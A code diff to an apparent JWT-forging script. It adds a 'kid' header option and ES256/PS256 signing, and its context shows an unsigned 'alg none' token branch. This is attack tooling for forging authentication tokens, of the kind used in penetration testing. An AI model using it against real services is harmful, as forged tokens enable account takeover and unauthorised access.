@@ -2,7 +2,7 @@ import base64
 import json
 import jwt
 
-def forge_jwt(alg, payload_str, secret=None, privkey_path=None):
+def forge_jwt(alg, payload_str, secret=None, privkey_path=None, kid=None):
     try:
         payload = json.loads(payload_str)
     except json.JSONDecodeError:
@@ -10,6 +10,8 @@ def forge_jwt(alg, payload_str, secret=None, privkey_path=None):
         return
 
     header = {"alg": alg, "typ": "JWT"}
+    if kid:
+        header["kid"] = kid
 
     if alg == "none":
         header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
@@ -28,9 +30,9 @@ def forge_jwt(alg, payload_str, secret=None, privkey_path=None):
         print(token)
         return
 
-    elif alg == "RS256":
+    elif alg in {"RS256", "ES256", "PS256"}:
         if not privkey_path:
-            print("[!] RS256 requires --privkey path to sign the token.")
+            print("[!] {} requires --privkey path to sign the token.".format(alg))
             return
         try:
             with open(privkey_path, "r") as f:
@@ -38,8 +40,8 @@ def forge_jwt(alg, payload_str, secret=None, privkey_path=None):
         except Exception as e:
             print(f"[!] Failed to read private key: {e}")
             return
-        token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)
-        print("\n[+] Forged JWT (RS256):")
+        token = jwt.encode(payload, private_key, algorithm=alg, headers=header)
+        print(f"\n[+] Forged JWT ({alg}):")
         print(token)
         return
 
